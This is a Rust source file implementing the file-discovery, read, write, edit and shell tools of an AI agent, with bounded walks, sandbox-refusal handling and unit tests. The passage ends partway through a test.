//! FsToolProvider — the built-in file discovery, read, write, edit, and shell
//! tools.
//!
//! Each tool declares its capability requirements, side effect, and idempotency;
//! the actual execution goes through the injected [`ExecutionEnvironment`], so
//! the tools stay backend-agnostic.
//!
//! Only command tools carry a deadline. A file read or write has no
//! `CommandSpec` to hand one to, and nothing downstream consumes a
//! `ToolDefinition.timeout_ms` for a synchronous call — declaring 5s here once
//! told the model about a limit that did not exist. File reads are bounded by
//! size instead (`MAX_FILE_BYTES` in `env.rs`), which is a limit the
//! environment does enforce.

use std::sync::Arc;

use agent_ports::execution_environment::{
    CommandSpec, DirEntryKind, ExecutionEnvironment, ExecutionEnvironmentError,
};
use agent_ports::tool_provider::{
    ToolDefinition, ToolInvocation, ToolProvider, ToolProviderError, ToolResult, ToolSideEffect,
    ToolSource,
};
use agent_protocol::permissions::Capability;

/// How long a shell command may run before it is killed. Declared on the tool
/// definition and enforced by the environment from the same number, so the
/// timeout the model is told about is the timeout that actually applies.
pub const SHELL_TIMEOUT_MS: u64 = 30_000;

/// How deep a recursive walk descends below the path it was given.
///
/// A workspace can contain a directory tree with no bottom (a generated
/// fixture, a mount). The depth is the walk's own bound so a listing cannot
/// turn one tool call into an unbounded traversal.
const MAX_WALK_DEPTH: usize = 32;

/// Most directory entries one walk visits before it stops.
const MAX_WALK_ENTRIES: usize = 20_000;

/// Most entries `fs.list` will name.
const MAX_LIST_ENTRIES: usize = 1_000;

/// Most paths `fs.glob` will return.
const MAX_GLOB_MATCHES: usize = 500;

/// Most lines `fs.grep` will return.
const MAX_GREP_MATCHES: usize = 200;

/// Longest line `fs.grep` will quote. A minified file would otherwise put an
/// unbounded single line into the transcript.
const MAX_GREP_LINE_CHARS: usize = 400;

/// The built-in file and shell tools, running on an injected execution backend.
pub struct FsToolProvider {
    env: Arc<dyn ExecutionEnvironment>,
}

impl FsToolProvider {
    pub fn new(env: Arc<dyn ExecutionEnvironment>) -> Self {
        Self { env }
    }

    fn required_str<'a>(
        invocation: &'a ToolInvocation,
        tool: &str,
        key: &str,
    ) -> Result<&'a str, ToolProviderError> {
        invocation.arguments.get(key).and_then(|v| v.as_str()).ok_or_else(|| {
            ToolProviderError::Failed {
                tool: tool.to_string(),
                message: format!("missing '{key}'"),
            }
        })
    }
}

#[async_trait::async_trait]
impl ToolProvider for FsToolProvider {
    fn definitions(&self) -> Vec<ToolDefinition> {
        vec![
            ToolDefinition {
                name: "fs.read".to_string(),
                description: "Read a file from the workspace and return its contents as text. \
                              `path` is resolved against the workspace root. `offset` and \
                              `limit` select a range of lines (1-based): `offset` is the first \
                              line, `limit` the most lines to return. Use them for a file too \
                              large to read whole; without them the whole file comes back."
                    .to_string(),
                source: ToolSource::Builtin,
                side_effect: ToolSideEffect::Read,
                capability_requirements: vec![Capability::new(Capability::FS_READ)],
                idempotent: true,
                timeout_ms: None,
                input_schema: serde_json::json!({
                    "type": "object",
                    "required": ["path"],
                    "properties": {
                        "path": { "type": "string" },
                        "offset": { "type": "integer", "minimum": 1 },
                        "limit": { "type": "integer", "minimum": 1 }
                    }
                }),
            },
            ToolDefinition {
                name: "fs.list".to_string(),
                description: "List a directory. `path` is resolved against the workspace root \
                              and defaults to the root itself. Directories end with `/` and \
                              symlinks are marked and never followed. Set `recursive` to walk \
                              the whole subtree; the result is sorted and capped."
                    .to_string(),
                source: ToolSource::Builtin,
                side_effect: ToolSideEffect::Read,
                capability_requirements: vec![Capability::new(Capability::FS_READ)],
                idempotent: true,
                timeout_ms: None,
                input_schema: serde_json::json!({
                    "type": "object",
                    "properties": {
                        "path": { "type": "string" },
                        "recursive": { "type": "boolean" }
                    }
                }),
            },
            ToolDefinition {
                name: "fs.glob".to_string(),
                description: "Find files by path pattern. `pattern` is matched against \
                              workspace-relative paths: `*` and `?` stay within one path \
                              segment and `**` matches any number of segments (for example \
                              `**/*.rs`). `path` narrows the walk to a subdirectory, and the \
                              pattern is still matched against the full relative path. Results \
                              are sorted and capped."
                    .to_string(),
                source: ToolSource::Builtin,
                side_effect: ToolSideEffect::Read,
                capability_requirements: vec![Capability::new(Capability::FS_READ)],
                idempotent: true,
                timeout_ms: None,
                input_schema: serde_json::json!({
                    "type": "object",
                    "required": ["pattern"],
                    "properties": {
                        "pattern": { "type": "string" },
                        "path": { "type": "string" }
                    }
                }),
            },
            ToolDefinition {
                name: "fs.grep".to_string(),
                description: "Search file contents for a literal piece of text (not a regular \
                              expression). Returns one `path:line: text` entry per matching \
                              line, sorted by path and line. `path` narrows the search to a \
                              directory; `glob` narrows which files are read (for example \
                              `**/*.rs`); `ignoreCase` matches case-insensitively. Results are \
                              capped."
                    .to_string(),
                source: ToolSource::Builtin,
                side_effect: ToolSideEffect::Read,
                capability_requirements: vec![Capability::new(Capability::FS_READ)],
                idempotent: true,
                timeout_ms: None,
                input_schema: serde_json::json!({
                    "type": "object",
                    "required": ["pattern"],
                    "properties": {
                        "pattern": { "type": "string" },
                        "path": { "type": "string" },
                        "glob": { "type": "string" },
                        "ignoreCase": { "type": "boolean" }
                    }
                }),
            },
            ToolDefinition {
                name: "fs.write".to_string(),
                description: "Write text to a file in the workspace, creating it or replacing \
                              its contents. `path` is resolved against the workspace root."
                    .to_string(),
                source: ToolSource::Builtin,
                side_effect: ToolSideEffect::Write,
                capability_requirements: vec![Capability::new(Capability::FS_WRITE)],
                idempotent: false,
                timeout_ms: None,
                input_schema: serde_json::json!({
                    "type": "object",
                    "required": ["path", "content"],
                    "properties": {
                        "path": { "type": "string" },
                        "content": { "type": "string" }
                    }
                }),
            },
            ToolDefinition {
                name: "shell.run".to_string(),
                description: shell_run_description(self.env.shell_language()),
                source: ToolSource::Builtin,
                side_effect: ToolSideEffect::Destructive,
                capability_requirements: vec![Capability::new(Capability::PROCESS_SPAWN)],
                idempotent: false,
                timeout_ms: Some(SHELL_TIMEOUT_MS),
                input_schema: serde_json::json!({
                    "type": "object",
                    "required": ["command"],
                    "properties": {
                        "command": { "type": "string" },
                        "cwd": { "type": "string" }
                    }
                }),
            },
            ToolDefinition {
                name: "fs.edit".to_string(),
                description: "Replace one exact occurrence of `oldString` with `newString` in a \
                              workspace file. The match is literal, so whitespace and \
                              indentation must be exact. Fails without changing anything if \
                              `oldString` is absent or appears more than once — include \
                              surrounding context to pin down the one you mean."
                    .to_string(),
                source: ToolSource::Builtin,
                side_effect: ToolSideEffect::Write,
                capability_requirements: vec![Capability::new(Capability::FS_WRITE)],
                idempotent: false,
                timeout_ms: None,
                input_schema: serde_json::json!({
                    "type": "object",
                    "required": ["path", "oldString", "newString"],
                    "properties": {
                        "path": { "type": "string" },
                        "oldString": { "type": "string" },
                        "newString": { "type": "string" }
                    }
                }),
            },
        ]
    }

    fn side_effect(&self, tool_name: &str) -> Option<ToolSideEffect> {
        match tool_name {
            "fs.read" | "fs.list" | "fs.glob" | "fs.grep" => Some(ToolSideEffect::Read),
            "fs.write" => Some(ToolSideEffect::Write),
            "fs.edit" => Some(ToolSideEffect::Write),
            "shell.run" => Some(ToolSideEffect::Destructive),
            _ => None,
        }
    }

    async fn invoke(&self, invocation: &ToolInvocation) -> Result<ToolResult, ToolProviderError> {
        match invocation.tool_name.as_str() {
            "fs.read" => {
                let path = Self::required_str(invocation, "fs.read", "path")?;
                let offset = line_argument(invocation, "offset")?.unwrap_or(1);
                let limit = line_argument(invocation, "limit")?;
                match self.env.read_file(path) {
                    // The line count is a fact about the file, not about the
                    // text the model reads: a reader that later decides
                    // whether a second read is worth it needs the size even
                    // when the content itself has been summarized away.
                    Ok(content) => {
                        let lines = content.lines().count() as u64;
                        if offset == 1 && limit.is_none() {
                            return Ok(ToolResult::completed(content).with_line_count(lines));
                        }
                        // A range is what a model asks for when the file is too
                        // large to read whole: reading all of `default.rs` in
                        // 2026-10-24's third dogfood round offloaded the text
                        // and left it reaching for shell just to see 56 lines.
                        let all: Vec<&str> = content.lines().collect();
                        let start = usize::try_from(offset - 1).unwrap_or(usize::MAX);
                        if start >= all.len() {
                            return Ok(ToolResult::completed(format!(
                                "offset {offset} is past the end: `{path}` has {lines} line(s)."
                            ))
                            .with_line_count(lines));
                        }
                        let take = limit.map_or(all.len() - start, |limit| {
                            usize::try_from(limit).unwrap_or(usize::MAX)
                        });
                        let end = start.saturating_add(take).min(all.len());
                        Ok(ToolResult::completed(all[start..end].join("\n")).with_line_count(lines))
                    }
                    Err(e) => environment_said("fs.read", "read", path, e),
                }
            }
            "fs.list" => {
                let root = dir_argument(invocation);
                let recursive = invocation
                    .arguments
                    .get("recursive")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                let (entries, truncated) = if recursive {
                    match walk(self.env.as_ref(), &root) {
                        Ok(walked) => walked,
                        Err(e) => return environment_said("fs.list", "list", &root, e),
                    }
                } else {
                    let listed = match self.env.list_dir(&root) {
                        Ok(listed) => listed,
                        Err(e) => return environment_said("fs.list", "list", &root, e),
                    };
                    (
                        listed
                            .into_iter()
                            .map(|entry| (join_path(&root, &entry.name), entry.kind))
                            .collect(),
                        false,
                    )
                };

                if entries.is_empty() {
                    return Ok(ToolResult::completed("(empty)".to_string()));
                }
                let mut body: Vec<String> = entries
                    .iter()
                    .take(MAX_LIST_ENTRIES)
                    .map(|(path, kind)| format_list_entry(path, *kind))
                    .collect();
                if entries.len() > MAX_LIST_ENTRIES {
                    body.push(format!(
                        "... truncated at {MAX_LIST_ENTRIES} entries; list a narrower path"
                    ));
                }
                if truncated {
                    body.push(format!(
                        "... the walk stopped at {MAX_WALK_ENTRIES} entries or \
                         {MAX_WALK_DEPTH} levels; the listing covers part of the tree"
                    ));
                }
                Ok(ToolResult::completed(body.join("\n")))
            }
            "fs.glob" => {
                let pattern = Self::required_str(invocation, "fs.glob", "pattern")?;
                if pattern.is_empty() {
                    return Err(failed("fs.glob", "pattern is empty, so nothing could match"));
                }
                let root = dir_argument(invocation);
                let (entries, truncated) = match walk(self.env.as_ref(), &root) {
                    Ok(walked) => walked,
                    Err(e) => return environment_said("fs.glob", "walk", &root, e),
                };
                let mut found: Vec<&str> = entries
                    .iter()
                    .filter(|(path, kind)| *kind == DirEntryKind::File && glob_match(pattern, path))
                    .map(|(path, _)| path.as_str())
                    .collect();
                let overflow = found.len() > MAX_GLOB_MATCHES;
                found.truncate(MAX_GLOB_MATCHES);
                if found.is_empty() {
                    // A bare name is matched against the whole relative path, so
                    // it cannot match a file under a subdirectory. "no matches"
                    // over a pattern that named nothing at all is what sent the
                    // 2026-10-24 dogfood run to the shell.
                    let body = if bare_pattern(pattern) {
                        glob_named_nothing("`pattern`", pattern)
                    } else {
                        String::from("no matches")
                    };
                    return Ok(ToolResult::completed(body));
                }
                let mut body = found.join("\n");
                if overflow {
                    body.push_str(&format!(
                        "\n... truncated at {MAX_GLOB_MATCHES} matches; narrow the pattern"
                    ));
                }
                if truncated {
                    body.push_str(&format!(
                        "\n... the walk stopped at {MAX_WALK_ENTRIES} entries or \
                         {MAX_WALK_DEPTH} levels; this covers part of the tree"
                    ));
                }
                Ok(ToolResult::completed(body))
            }
            "fs.grep" => {
                let needle = Self::required_str(invocation, "fs.grep", "pattern")?;
                if needle.is_empty() {
                    return Err(failed("fs.grep", "pattern is empty, so nothing could match"));
                }
                let root = dir_argument(invocation);
                let glob = invocation
                    .arguments
                    .get("glob")
                    .and_then(|v| v.as_str())
                    .filter(|glob| !glob.is_empty());
                let ignore_case = invocation
                    .arguments
                    .get("ignoreCase")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                let lowered = needle.to_lowercase();

                let (entries, truncated) = match walk(self.env.as_ref(), &root) {
                    Ok(walked) => walked,
                    Err(e) => return grep_walk_failure(self.env.as_ref(), &root, e),
                };
                let mut matches = Vec::new();
                let mut skipped = 0usize;
                let mut considered = 0usize;
                let mut capped = false;
                'files: for (path, kind) in entries {
                    if kind != DirEntryKind::File {
                        continue;
                    }
                    if glob.is_some_and(|pattern| !glob_match(pattern, &path)) {
                        continue;
                    }
                    considered += 1;
                    let content = match self.env.read_file(&path) {
                        Ok(content) => content,
                        // A file that cannot be read, is too large, or is not
                        // text is not a match and not a failure of the search.
                        // It is counted, because "no matches" over a tree that
                        // was only partly searched would be a false answer.
                        Err(_) => {
                            skipped += 1;
                            continue;
                        }
                    };
                    if content.as_bytes().contains(&0) {
                        skipped += 1;
                        continue;
                    }
                    for (index, raw) in content.split('\n').enumerate() {
                        let line = raw.strip_suffix('\r').unwrap_or(raw);
                        let hit = if ignore_case {
                            line.to_lowercase().contains(&lowered)
                        } else {
                            line.contains(needle)
                        };
                        if !hit {
                            continue;
                        }
                        if matches.len() == MAX_GREP_MATCHES {
                            capped = true;
                            break 'files;
                        }
                        matches.push(format!("{path}:{}: {}", index + 1, grep_line(line)));
                    }
                }

                let mut body = match (matches.is_empty(), glob) {
                    (true, Some(pattern)) if considered == 0 && bare_pattern(pattern) => {
                        // The glob named no file at all, which is a different
                        // answer from "the files were searched and nothing hit":
                        // it sent the 2026-10-24 dogfood run to the shell twice.
                        glob_named_nothing("`glob`", pattern)
                    }
                    (true, _) => String::from("no matches"),
                    (false, _) => matches.join("\n"),
                };
                if capped {
                    body.push_str(&format!(
                        "\n... stopped at {MAX_GREP_MATCHES} matches; narrow the pattern"
                    ));
                }
                if skipped > 0 {
                    body.push_str(&format!(
                        "\n... {skipped} file(s) could not be searched (unreadable, too large, \
                         or not text)"
                    ));
                }
                if truncated {
                    body.push_str(&format!(
                        "\n... the walk stopped at {MAX_WALK_ENTRIES} entries or \
                         {MAX_WALK_DEPTH} levels; this covers part of the tree"
                    ));
                }
                Ok(ToolResult::completed(body))
            }
            "fs.write" => {
                let path = Self::required_str(invocation, "fs.write", "path")?;
                let content = Self::required_str(invocation, "fs.write", "content")?;
                match self.env.write_file(path, content) {
                    Ok(()) => Ok(ToolResult::completed(format!("wrote {path}"))),
                    Err(e) => environment_said("fs.write", "write", path, e),
                }
            }
            "shell.run" => {
                let command = Self::required_str(invocation, "shell.run", "command")?;
                let cwd =
                    invocation.arguments.get("cwd").and_then(|v| v.as_str()).map(String::from);
                let spec = shell_spec(self.env.as_ref(), command.to_string(), cwd);
                match self.env.run_command(&spec) {
                    Ok(out) => {
                        // The exit code leads a failed result so the model does
                        // not have to infer "this is a failure" from isError,
                        // and can tell "the command said no" apart from "it
                        // never ran". The output follows unchanged: it is the
                        // reason, and the same text is what the event log
                        // keeps for later review.
                        let mut body = String::new();
                        if out.exit_code != 0 {
                            body.push_str(&format!("exit code {}\n", out.exit_code));
                        }
                        body.push_str(&out.stdout);
                        if !out.stderr.is_empty() {
                            if !body.is_empty() && !body.ends_with('\n') {
                                body.push('\n');
                            }
                            body.push_str("[stderr]\n");
                            body.push_str(&out.stderr);
                        }
                        let result = if out.exit_code != 0 {
                            ToolResult::failed(body)
                        } else {
                            ToolResult::completed(body)
                        }
                        // Recorded for every run, success included: the text
                        // says `exit code N` only when N is non-zero, and a
                        // reader should not have to read its absence as zero.
                        .with_exit_code(out.exit_code);
                        // A command killed at its deadline, or one whose output
                        // outran the cap, is still a result — the flag is what
                        // keeps "we did not see all of it" from looking like
                        // "there was not any more of it".
                        Ok(if out.truncated { result.truncated() } else { result })
                    }
                    Err(e) => Err(failed("shell.run", &e.to_string())),
                }
            }
            "fs.edit" => {
                let path = Self::required_str(invocation, "fs.edit", "path")?;
                let old = Self::required_str(invocation, "fs.edit", "oldString")?;
                let new = Self::required_str(invocation, "fs.edit", "newString")?;
                if old.is_empty() {
                    // A request with nothing to anchor on. The file was never
                    // opened, so this is the call being wrong rather than an
                    // answer about a file.
                    return Err(failed(
                        "fs.edit",
                        "oldString is empty, so there is nothing to anchor the replacement on",
                    ));
                }
                let content = match self.env.read_file(path) {
                    Ok(content) => content,
                    Err(e) => return environment_said("fs.edit", "read", path, e),
                };
                let occurrences = content.matches(old).count();
                // The file was read and this is what is in it. A model reading
                // "your anchor is not there" or "your anchor is ambiguous" is
                // reading a result, and so is a script that reads `$?`.
                if occurrences == 0 {
                    return Ok(ToolResult::failed(format!(
                        "oldString does not appear in {path}; nothing was changed"
                    )));
                }
                if occurrences > 1 {
                    // Replacing the wrong one of several is worse than not
                    // editing: the model gets a chance to add the context that
                    // makes its intent unambiguous.
                    return Ok(ToolResult::failed(format!(
                        "oldString appears {occurrences} times in {path}; include more \
                         surrounding context so it matches exactly once"
                    )));
                }
                let updated = content.replacen(old, new, 1);
                match self.env.write_file(path, &updated) {
                    Ok(()) => Ok(ToolResult::completed(format!("edited {path}"))),
                    Err(e) => environment_said("fs.edit", "write", path, e),
                }
            }
            other => Err(ToolProviderError::UnknownTool {
                tool: other.to_string(),
                available: self.definitions().into_iter().map(|d| d.name).collect(),
            }),
        }
    }
}

/// The directory a listing or search starts at.
///
/// Absent means the workspace root, and so does a path that trims to nothing:
/// a caller that wrote `""` or `"/"` was naming the root, not asking for an
/// error about its spelling.
fn dir_argument(invocation: &ToolInvocation) -> String {
    match invocation.arguments.get("path").and_then(|v| v.as_str()) {
        None | Some("") => ".".to_string(),
        Some(path) => {
            let trimmed = path.trim_end_matches(['/', '\\']);
            if trimmed.is_empty() { ".".to_string() } else { trimmed.to_string() }
        }
    }
}

/// The workspace-relative spelling of `name` inside `dir`.
fn join_path(dir: &str, name: &str) -> String {
    if dir.is_empty() || dir == "." { name.to_string() } else { format!("{dir}/{name}") }
}

/// One line of an `fs.list` answer.
fn format_list_entry(path: &str, kind: DirEntryKind) -> String {
    match kind {
        DirEntryKind::Directory => format!("{path}/"),
        DirEntryKind::Symlink => format!("{path} (symlink)"),
        DirEntryKind::File | DirEntryKind::Other => path.to_string(),
    }
}

/// The line `fs.grep` quotes, bounded so one minified line cannot fill the
/// transcript.
fn grep_line(line: &str) -> String {
    match line.char_indices().nth(MAX_GREP_LINE_CHARS) {
        Some((cut, _)) => format!("{}...", &line[..cut]),
        None => line.to_string(),
    }
}

/// Walk `root` and everything below it, in path order.
///
/// Directories are descended into, files and links are reported, and a link is
/// never followed. The answer is `(entries, truncated)`; `truncated` says the
/// walk hit one of its own bounds, so a caller can tell "this is the tree" from
/// "this is as much of the tree as one call will read".
fn walk(
    env: &dyn ExecutionEnvironment,
    root: &str,
) -> Result<(Vec<(String, DirEntryKind)>, bool), ExecutionEnvironmentError> {
    let mut entries = Vec::new();
    let mut truncated = false;
    let mut visited = 0usize;
    let mut stack = vec![(root.to_string(), 0usize)];
    'walk: while let Some((dir, depth)) = stack.pop() {
        if depth > MAX_WALK_DEPTH {
            truncated = true;
            continue;
        }
        for entry in env.list_dir(&dir)? {
            visited += 1;
            if visited > MAX_WALK_ENTRIES {
                truncated = true;
                break 'walk;
            }
            let path = join_path(&dir, &entry.name);
            if entry.kind == DirEntryKind::Directory {
                stack.push((path.clone(), depth + 1));
            }
            entries.push((path, entry.kind));
        }
    }
    entries.sort_by(|a, b| a.0.cmp(&b.0));
    Ok((entries, truncated))
}

/// Whether a pattern is a bare name rather than a path.
///
/// [`glob_match`] matches the whole workspace-relative path, so a pattern with
/// no separator can only name a file at the root; one that carries a separator
/// already says where it expects the file to be.
fn bare_pattern(pattern: &str) -> bool {
    !pattern.contains(['/', '\\'])
}

/// The answer when a glob-shaped pattern named no file at all.
///
/// "no matches" is true but says nothing about why, and the why is a rule: the
/// pattern is matched against the workspace-relative path, so `default.rs`
/// says nothing about `crates/agent-loop/src/default.rs`. On 2026-10-24 the
/// model made that call twice, read the two "no matches" as "the file is not
/// there", and spent the rest of the turn on shell probes. Naming the rule and
/// the spelling that would have matched ends that loop in one call.
fn glob_named_nothing(field: &str, pattern: &str) -> String {
    format!(
        "no matches: {field} is matched against the workspace-relative path, so a bare name \
         only names a file at the workspace root. If the file is under a subdirectory, \
         `**/{pattern}` is the spelling that matches it."
    )
}

/// Whether the workspace-relative `path` matches `pattern`.
///
/// `*` and `?` stay within one path segment and `**` matches zero or more whole
/// segments. That is the whole language: a shell glob's brace and class syntax
/// is not supported, and pretending otherwise would only make a pattern like
/// `*.{rs,toml}` match nothing without saying why.
fn glob_match(pattern: &str, path: &str) -> bool {
    let pattern: Vec<&str> = pattern.split(['/', '\\']).filter(|part| !part.is_empty()).collect();
    let path: Vec<&str> = path.split('/').filter(|part| !part.is_empty()).collect();
    match_segments(&pattern, &path)
}

fn match_segments(pattern: &[&str], path: &[&str]) -> bool {
    let Some((first, rest)) = pattern.split_first() else {
        return path.is_empty();
    };
    if *first == "**" {
        // Zero segments here, or one segment and `**` still to match.
        return match_segments(rest, path)
            || (!path.is_empty() && match_segments(pattern, &path[1..]));
    }
    !path.is_empty() && segment_match(first, path[0]) && match_segments(rest, &path[1..])
}

/// Whether one path segment matches one pattern segment.
fn segment_match(pattern: &str, name: &str) -> bool {
    let pattern: Vec<char> = pattern.chars().collect();
    let name: Vec<char> = name.chars().collect();
    let (mut p, mut n) = (0usize, 0usize);
    // Where the last `*` was, and how much of the name it has consumed so far:
    // the classic linear backtracking match, so `a*b*c` does not go exponential.
    let (mut star, mut mark) = (None, 0usize);
    while n < name.len() {
        if p < pattern.len() && (pattern[p] == '?' || pattern[p] == name[n]) {
            p += 1;
            n += 1;
        } else if p < pattern.len() && pattern[p] == '*' {
            star = Some(p);
            mark = n;
            p += 1;
        } else if let Some(position) = star {
            p = position + 1;
            mark += 1;
            n = mark;
        } else {
            return false;
        }
    }
    while p < pattern.len() && pattern[p] == '*' {
        p += 1;
    }
    p == pattern.len()
}

fn failed(tool: &str, message: &str) -> ToolProviderError {
    ToolProviderError::Failed { tool: tool.to_string(), message: message.to_string() }
}

/// Report what the environment said about a file the tool set out to touch.
///
/// The status a caller reads off `$?` asks whether the call was *made*, so the
/// two kinds of environment error cannot share one answer.
///
/// A sandbox refusal — the path is outside the workspace, the mode is
/// read-only, the file is protected metadata — is the boundary answering
/// instead of the tool. Nothing was read and nothing was written, so the call
/// stays an error: a script that saw "1" here would think the agent had looked
/// at the file and found something there.
///
/// Everything else is a verdict about a file the tool did reach. That is an
/// answer, and it travels back the way a non-zero `shell.run` and a server's
/// `isError` already do: a failed [`ToolResult`], printed, with `1` to say the
/// answer was a no. Sending it down the error channel instead is what made one
/// "cannot do it" arrive as two different statuses depending only on which
/// shape the backend happened to use.
fn environment_said(
    tool: &str,
    verb: &str,
    path: &str,
    error: ExecutionEnvironmentError,
) -> Result<ToolResult, ToolProviderError> {
    if refused(&error) {
        return Err(failed(tool, &error.to_string()));
    }
    // The path is named because this is now the answer, and "IO error: the
    // system cannot find the file specified" answers a question nobody can act
    // on without being told which file.
    Ok(ToolResult::failed(format!("could not {verb} {path}: {error}")))
}

/// One of `fs.read`'s line arguments, when it was given.
///
/// Absent means "no bound". Zero is refused rather than clamped: a caller that
/// wrote `limit: 0` asked for no lines, and answering with the whole file would
/// answer a different question than the one asked.
fn line_argument(
    invocation: &ToolInvocation,
    name: &str,
) -> Result<Option<u64>, ToolProviderError> {
    let Some(value) = invocation.arguments.get(name) else {
        return Ok(None);
    };
    let Some(number) = value.as_u64() else {
        return Err(failed("fs.read", &format!("`{name}` must be a whole number of lines")));
    };
    if number == 0 {
        return Err(failed(
            "fs.read",
            &format!("`{name}` must be at least 1: lines are counted from 1"),
        ));
    }
    Ok(Some(number))
}

/// Whether the environment refused the call rather than failing at it.
fn refused(error: &ExecutionEnvironmentError) -> bool {
    matches!(
        error,
        ExecutionEnvironmentError::PathOutsideWorkspace { .. }
            | ExecutionEnvironmentError::NotPermitted { .. }
            | ExecutionEnvironmentError::ProtectedPath(_)
    )
}

/// Why `fs.grep` could not start walking at `root`, said so the next call can
/// use it.
///
/// The common mistake is naming a file where the tool wants the directory to
/// search: the OS answer is "the directory name is invalid", which names
/// neither the argument nor the fix. In 2026-10-24's real use the model passed
/// a file twice, then fell back to `shell.run` — which needs an approval — to
/// do what `fs.grep` would have done. When the parent lists `root` as a file,
/// the answer names the two arguments to change and the call that ends the
/// loop.
fn grep_walk_failure(
    env: &dyn ExecutionEnvironment,
    root: &str,
    error: ExecutionEnvironmentError,
) -> Result<ToolResult, ToolProviderError> {
    if refused(&error) {
        return Err(failed("fs.grep", &error.to_string()));
    }
    if let Some((parent, name)) = split_last_segment(root)
        && let Ok(entries) = env.list_dir(parent)
        && entries.iter().any(|entry| entry.name == name && entry.kind == DirEntryKind::File)
    {
        let hint = if name.contains('*') || name.contains('?') || name.contains('[') {
            format!(
                "Pass `path: \"{parent}\"` and read it with fs.read — `glob` cannot name this \
                 file."
            )
        } else {
            format!("Pass `path: \"{parent}\"` with `glob: \"{name}\"`, or read it with fs.read.")
        };
        return Ok(ToolResult::failed(format!(
            "`{root}` is a file, and `path` names the directory to search. {hint}"
        )));
    }
    Ok(ToolResult::failed(format!("could not walk {root}: {error}")))
}

/// The directory and last segment of a workspace-relative path.
fn split_last_segment(path: &str) -> Option<(&str, &str)> {
    match path.rfind(['/', '\\']) {
        Some(index) => {
            let (parent, rest) = path.split_at(index);
            let name = rest.trim_start_matches(['/', '\\']);
            if name.is_empty() {
                None
            } else {
                Some((if parent.is_empty() { "." } else { parent }, name))
            }
        }
        None if !path.is_empty() && path != "." => Some((".", path)),
        None => None,
    }
}

/// The `shell.run` description, in terms of the shell the backend actually uses.
///
/// The backend substitutes PowerShell inside an AppContainer while the host
/// convention is `cmd`/`sh`. A description that names only the host convention
/// invited a model to wrap the command in `powershell -Command` itself; under
/// the AppContainer wrapper the outer PowerShell then expanded `$env:…` before
/// the inner one saw it (2026-10-21 real use).
fn shell_run_description(language: Option<&str>) -> String {
    let common = "On Windows an executable in the current directory is not found by bare name \
                  — write `.\\name`. A non-zero exit code comes back as a failed tool result \
                  whose first line is `exit code N`, followed by the command's output; the exit \
                  code is already reported, so there is no need to echo it. `cwd` defaults to \
                  the workspace root.";
    match language {
        Some(language) => format!(
            "Run a {language} command and return its output. Commands run under {language}; \
             write the command in {language} syntax and pass it as {language} receives it — do \
             not wrap it in `cmd /C`, `sh -c`, or another {language} invocation. {common}"
        ),
        None => format!(
            "Run a shell command and return its output. The backend wraps the command as \
             `cmd /C <command>` on Windows or `sh -c <command>` elsewhere, so pass the command \
             as the shell receives it — do not add `cmd /C` or `sh -c` yourself. {common}"
        ),
    }
}

/// Wrap a shell command string the way the backend's shell requires.
///
/// The wrapper comes from the environment rather than from a `cfg` here: which
/// shell can run inside a confinement is the backend's fact, and a second
/// hardcoded copy would keep saying `cmd /C` on a backend where `cmd.exe`
/// cannot start a child process.
fn shell_spec(env: &dyn ExecutionEnvironment, command: String, cwd: Option<String>) -> CommandSpec {
    let invocation = env.shell_invocation(&command);

    // The deadline travels with the spec. Leaving it `None` here is how the
    // declared 30s once became decorative: the definition promised a limit that
    // nothing downstream was told about.
    CommandSpec {
        program: invocation.program,
        args: invocation.args,
        cwd,
        timeout_ms: Some(SHELL_TIMEOUT_MS),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{LocalExecutionEnvironment, StdProcessLauncher};

    fn provider(dir: &tempfile::TempDir) -> FsToolProvider {
        FsToolProvider::new(Arc::new(LocalExecutionEnvironment::new(dir.path().to_path_buf())))
    }

    #[test]
    fn the_shell_description_names_the_shell_the_backend_actually_uses() {
        let dir = tempfile::tempdir().unwrap();
        let description = |provider: FsToolProvider| {
            provider
                .definitions()
                .into_iter()
                .find(|definition| definition.name == "shell.run")
                .expect("shell.run is defined")
                .description
        };

        let host = description(provider(&dir));
        assert!(host.contains("cmd /C") || host.contains("sh -c"));
        assert!(!host.contains("Commands run under"));

        let sandboxed = LocalExecutionEnvironment::app_container(
            dir.path(),
            Arc::new(StdProcessLauncher),
            true,
        );
        let sandboxed = description(FsToolProvider::new(Arc::new(sandboxed)));
        assert!(sandboxed.contains("Commands run under PowerShell"));
        assert!(!sandboxed.contains("It is not PowerShell syntax"));
    }

    fn inv(tool: &str, args: serde_json::Value) -> ToolInvocation {
        ToolInvocation::proposed(tool, args)
    }

    #[tokio::test]
    async fn fs_read_returns_file_content() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("a.txt"), "hello").unwrap();
        let out = provider(&dir)
            .invoke(&inv("fs.read", serde_json::json!({ "path": "a.txt" })))
            .await
            .unwrap();
        assert_eq!(out.content, "hello");
        assert_eq!(out.facts.line_count, Some(1));
    }

    #[tokio::test]
    async fn fs_write_writes_a_file() {
        let dir = tempfile::tempdir().unwrap();
        provider(&dir)
            .invoke(&inv("fs.write", serde_json::json!({ "path": "b.txt", "content": "data" })))
            .await
            .unwrap();
        assert_eq!(std::fs::read_to_string(dir.path().join("b.txt")).unwrap(), "data");
    }

    #[tokio::test]
    async fn fs_read_outside_workspace_fails() {
        let dir = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        let secret = outside.path().join("s.txt");
        std::fs::write(&secret, "secret").unwrap();
        let err = provider(&dir)
            .invoke(&inv("fs.read", serde_json::json!({ "path": secret.to_str().unwrap() })))
            .await
            .unwrap_err();
        assert!(matches!(err, ToolProviderError::Failed { .. }));
    }

    #[tokio::test]
    async fn fs_read_answers_a_file_that_is_not_there() {
        let dir = tempfile::tempdir().unwrap();
        let result = provider(&dir)
            .invoke(&inv("fs.read", serde_json::json!({ "path": "absent.txt" })))
            .await
            .expect("the tool reached the file, so it has an answer either way");
        assert_eq!(result.status, agent_ports::tool_provider::ToolStatus::Failed);
        // The environment's own message for a missing file names no file, and
        // this is the answer now — so the path is put back in.
        assert!(result.content.contains("absent.txt"), "{result:?}");
        assert!(result.content.contains("could not read"), "{result:?}");
    }

    #[tokio::test]
    async fn unknown_tool_is_rejected() {
        let dir = tempfile::tempdir().unwrap();
        let err = provider(&dir).invoke(&inv("nope", serde_json::json!({}))).await.unwrap_err();
        assert!(matches!(err, ToolProviderError::UnknownTool { .. }));
        // Reaching a provider at all means the gateway already admitted the
